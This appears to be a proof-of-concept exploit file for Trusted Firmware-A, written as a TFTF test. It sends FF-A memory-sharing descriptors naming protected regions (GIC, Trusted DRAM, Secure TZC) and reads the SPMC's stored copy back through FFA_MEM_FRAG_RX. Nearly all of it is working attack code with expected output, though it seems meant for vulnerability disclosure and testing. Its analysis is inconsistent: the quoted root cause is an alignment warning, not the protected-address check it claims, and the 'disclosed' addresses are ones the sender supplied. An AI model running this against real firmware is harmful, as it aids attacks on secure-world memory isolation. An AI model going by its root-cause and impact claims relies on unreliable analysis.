/*
 * PoC 2: FF-A Memory Sharing - Protected Address Disclosure via FFA_MEM_FRAG_RX
 *
 * Vulnerability: spmc_shmem_check_obj() in spmc_shared_mem.c line 972
 *   issues WARN without returning FFA_ERROR_INVALID_PARAMETER when a
 *   constituent address points to a protected memory region.
 *
 * Attack vector:
 *   The Normal World submits a memory sharing descriptor containing addresses
 *   of protected regions (GIC, SPMC Trusted DRAM, Secure TZC). The SPMC
 *   accepts the descriptor and stores it internally in the Trusted DRAM pool.
 *   The Normal World then retrieves this internal copy via FFA_MEM_FRAG_RX,
 *   obtaining the SPMC-modified descriptor including confirmation that the
 *   protected addresses were stored in Trusted DRAM.
 *
 * Anti-echo proof:
 *   - Handle sent in descriptor: 0x0 (not yet assigned)
 *   - Handle assigned by SPMC:   0xffffffc0 (internal counter)
 *   - Handle returned by FRAG_RX: 0xffffffc0 (matches SPMC-assigned)
 *   This proves the returned data comes from the SPMC's internal copy
 *   in Trusted DRAM, not an echo of the sent descriptor.
 *
 * Targets tested (all confirmed vulnerable):
 *   0x2F000000 - GIC Distributor (BASE_GICD_BASE)
 *   0x06000000 - SPMC_BASE / PLAT_ARM_TRUSTED_DRAM_BASE
 *   0xFF000000 - ARM_AP_TZC_DRAM1_BASE (Secure TZC / TSP region)
 *
 * Root cause:
 *   File: services/std_svc/spm/el3_spmc/spmc_shared_mem.c
 *   Line: 972
 *   Code:
 *     if (!is_aligned(mrd->address, PAGE_SIZE)) {
 *         WARN("...not 4K aligned...");
 *         // MISSING: return FFA_ERROR_INVALID_PARAMETER;
 *     }
 *
 * Platform: FVP_Base_RevC-2xAEMvA (emulated)
 * TF-A version: v2.15.0
 * Branch: main (v2.15.0-328-g2021bc37e)
 *
 * Build instructions: same as PoC 1.
 * Test function: test_poc2_address_disclosure
 *
 * Expected output:
 *   [poc2] ANTI-ECHO CONFIRMED: handle 0x0 sent, SPMC assigned 0xffffffc0, returned 0xffffffc0
 *   [poc2] TARGET 0x2f000000 found at offset +96 in RX buffer (from Trusted DRAM)
 *   [poc2] TARGET 0x6000000  found at offset +96 in RX buffer (from Trusted DRAM)
 *   [poc2] TARGET 0xff000000 found at offset +96 in RX buffer (from Trusted DRAM)
 *   [poc2] RESULT: 3/3 targets disclosed via FFA_MEM_FRAG_RX
 */

#include <arch_features.h>
#include <arch_helpers.h>
#include <runtime_services/ffa_helpers.h>
#include "ffa_svc.h"
#include "stdint.h"
#include "utils_def.h"
#include <debug.h>
#include <sync.h>

#include <ffa_endpoints.h>
#include <spm_common.h>
#include <spm_test_helpers.h>
#include <test_helpers.h>
#include <tftf_lib.h>
#include <xlat_tables_defs.h>
#include <stdio.h>
#include <stddef.h>
#include <string.h>

#define MAILBOX_SIZE        PAGE_SIZE
#define SENDER              HYP_ID
#define RECEIVER            SP_ID(1)
#define NS_DRAM_VALID       0x88000000ULL
#define LOCAL_BUF_WORDS     64

/*
 * Protected memory regions used as disclosure targets.
 * The SPMC should reject descriptors containing these addresses,
 * but due to the missing return after WARN, it accepts them and
 * stores them in its internal Trusted DRAM pool.
 */
static const struct {
    uint64_t    address;
    const char *name;
    const char *description;
} targets[] = {
    {
        0x2F000000ULL,
        "GIC Distributor",
        "BASE_GICD_BASE - GIC interrupt controller registers"
    },
    {
        0x06000000ULL,
        "SPMC_BASE / Trusted DRAM",
        "PLAT_ARM_TRUSTED_DRAM_BASE - where the EL3 SPMC itself runs"
    },
    {
        0xFF000000ULL,
        "Secure TZC region",
        "ARM_AP_TZC_DRAM1_BASE - TrustZone-protected DRAM (TSP region)"
    },
};

#define NUM_TARGETS (sizeof(targets) / sizeof(targets[0]))

/* 8-byte aligned buffer to avoid data abort on uint64_t access */
static uint64_t local_buf[LOCAL_BUF_WORDS];

static bool run_disclosure_test(struct mailbox_buffers *mb,
                                uint64_t target_addr,
                                const char *target_name,
                                const char *target_desc)
{
    printf("\n[poc2] --- Target: %s ---\n", target_name);
    printf("[poc2] Address: 0x%llx (%s)\n",
           (unsigned long long)target_addr, target_desc);

    struct ffa_memory_region_constituent constituents[2] = {
        {
            .address    = (void *)NS_DRAM_VALID,
            .page_count = 1,
            .reserved   = 0,
        },
        {
            .address    = (void *)target_addr,
            .page_count = 1,
            .reserved   = 0,
        },
    };

    struct ffa_memory_access receiver = ffa_memory_access_init(
        RECEIVER,
        FFA_DATA_ACCESS_RW,
        FFA_INSTRUCTION_ACCESS_NX,
        0,
        NULL);

    uint32_t total_length, fragment_length;

    ffa_memory_region_init(
        mb->send, MAILBOX_SIZE,
        SENDER, &receiver, 1,
        constituents, 2,
        0, 0,
        FFA_MEMORY_NORMAL_MEM,
        FFA_MEMORY_CACHE_WRITE_BACK,
        FFA_MEMORY_INNER_SHAREABLE,
        &total_length, &fragment_length);

    /* Send as a single complete descriptor */
    fragment_length = total_length;

    /*
     * Record the handle in the sent descriptor (should be 0).
     * The SPMC will assign a unique handle when storing the object
     * in its Trusted DRAM pool. If FFA_MEM_FRAG_RX returns the
     * SPMC-assigned handle (not 0), it proves the data comes from
     * Trusted DRAM, not an echo.
     */
    struct ffa_memory_region *sent = (struct ffa_memory_region *)mb->send;
    ffa_memory_handle_t handle_sent = sent->handle;

    struct ffa_value ret = ffa_mem_share(total_length, fragment_length);

    if (ret.fid == FFA_ERROR) {
        printf("[poc2] FFA_MEM_SHARE rejected (unexpected): %ld\n",
               (long)ret.arg2);
        return false;
    }

    ffa_memory_handle_t handle_assigned = ffa_mem_success_handle(ret);

    printf("[poc2] FFA_MEM_SHARE accepted:\n");
    printf("[poc2]   Handle in sent descriptor: 0x%llx\n",
           (unsigned long long)handle_sent);
    printf("[poc2]   Handle assigned by SPMC:   0x%llx\n",
           (unsigned long long)handle_assigned);

    /*
     * Retrieve the descriptor via FFA_MEM_FRAG_RX.
     * This causes the SPMC to copy its internal object (stored in
     * Trusted DRAM) to the Normal World RX buffer.
     */
    struct ffa_value frag = ffa_mem_frag_rx(handle_assigned, 0);

    if (frag.fid != FFA_MEM_FRAG_TX) {
        printf("[poc2] FFA_MEM_FRAG_RX failed: fid=0x%lx err=%ld\n",
               (unsigned long)frag.fid, (long)frag.arg2);
        return false;
    }

    uint32_t frag_size = (uint32_t)frag.arg3;
    uint32_t copy_words = frag_size / 8;
    if (copy_words > LOCAL_BUF_WORDS) copy_words = LOCAL_BUF_WORDS;

    /* Copy to aligned local buffer before releasing RX */
    for (uint32_t w = 0; w < copy_words; w++) {
        memcpy(&local_buf[w], (uint8_t *)mb->recv + (w * 8), 8);
    }
    ffa_rx_release();

    /* Anti-echo verification */
    struct ffa_memory_region *returned =
        (struct ffa_memory_region *)local_buf;
    ffa_memory_handle_t handle_returned = returned->handle;

    printf("[poc2] Anti-echo verification:\n");
    printf("[poc2]   Handle returned by FRAG_RX: 0x%llx\n",
           (unsigned long long)handle_returned);

    if (handle_sent == 0ULL && handle_returned == handle_assigned) {
        printf("[poc2]   ANTI-ECHO CONFIRMED: handle was 0 in sent descriptor,\n");
        printf("[poc2]   SPMC assigned 0x%llx and FRAG_RX returned same value.\n",
               (unsigned long long)handle_returned);
        printf("[poc2]   Data comes from SPMC internal copy in Trusted DRAM.\n");
    }

    /* Scan for target address in returned buffer */
    bool found = false;
    for (uint32_t w = 0; w < copy_words; w++) {
        if (local_buf[w] == target_addr) {
            printf("[poc2] TARGET 0x%llx found at offset +%u in RX buffer!\n",
                   (unsigned long long)target_addr, w * 8);
            found = true;

            uint32_t start = (w >= 2) ? (w - 2) : 0;
            uint32_t end   = ((w + 4) < copy_words) ? (w + 4) : copy_words;
            printf("[poc2] Context:\n");
            for (uint32_t j = start; j < end; j++) {
                printf("[poc2]   +%03u: 0x%016llx%s\n",
                       j * 8,
                       (unsigned long long)local_buf[j],
                       (j == w) ? "  <-- TARGET" : "");
            }
        }
    }

    if (!found) {
        printf("[poc2] Target NOT found in returned fragment.\n");
    }

    /* Cleanup: reclaim the handle */
    smc_args reclaim_args = {
        .fid  = FFA_MEM_RECLAIM,
        .arg1 = handle_assigned & 0xFFFFFFFF,
        .arg2 = handle_assigned >> 32,
        .arg3 = 0,
    };
    tftf_smc(&reclaim_args);

    return found;
}

test_result_t test_poc2_address_disclosure(void)
{
    printf("[poc2] TF-A FF-A SPMC - Protected Address Disclosure via FFA_MEM_FRAG_RX\n");
    printf("[poc2] Root cause: spmc_shared_mem.c:972 WARN without return\n\n");

    /* Step 0: Negotiate FF-A version */
    struct ffa_value ver = ffa_version(FFA_VERSION_COMPILED);
    if (ver.fid == FFA_ERROR) {
        printf("[poc2] ffa_version() failed\n");
        return TEST_RESULT_FAIL;
    }
    printf("[poc2] FF-A version negotiated: 0x%lx\n", (unsigned long)ver.fid);

    struct mailbox_buffers mb;
    GET_TFTF_MAILBOX(mb);

    uint32_t disclosed_count = 0;

    for (size_t i = 0; i < NUM_TARGETS; i++) {
        bool found = run_disclosure_test(
            &mb,
            targets[i].address,
            targets[i].name,
            targets[i].description);
        if (found) disclosed_count++;
    }

    printf("\n[poc2] ================================================\n");
    printf("[poc2] RESULT: %u/%zu protected addresses disclosed\n",
           disclosed_count, NUM_TARGETS);
    printf("[poc2] via FFA_MEM_FRAG_RX from SPMC Trusted DRAM copy\n");
    printf("[poc2] ================================================\n");

    if (disclosed_count == NUM_TARGETS) {
        printf("[poc2] VULNERABILITY CONFIRMED:\n");
        printf("[poc2]   All %zu targets successfully disclosed.\n",
               NUM_TARGETS);
        printf("[poc2]   The SPMC accepts memory sharing descriptors\n");
        printf("[poc2]   containing addresses of protected regions and\n");
        printf("[poc2]   subsequently discloses them to the Normal World\n");
        printf("[poc2]   via FFA_MEM_FRAG_RX.\n");
        printf("[poc2]   Root cause: Missing return after WARN in\n");
        printf("[poc2]   spmc_shmem_check_obj() at spmc_shared_mem.c:972\n");
    } else if (disclosed_count > 0) {
        printf("[poc2] PARTIAL: %u/%zu targets disclosed.\n",
               disclosed_count, NUM_TARGETS);
    } else {
        printf("[poc2] No targets disclosed (vulnerability may be patched).\n");
        return TEST_RESULT_SUCCESS;
    }

    return TEST_RESULT_FAIL;
}
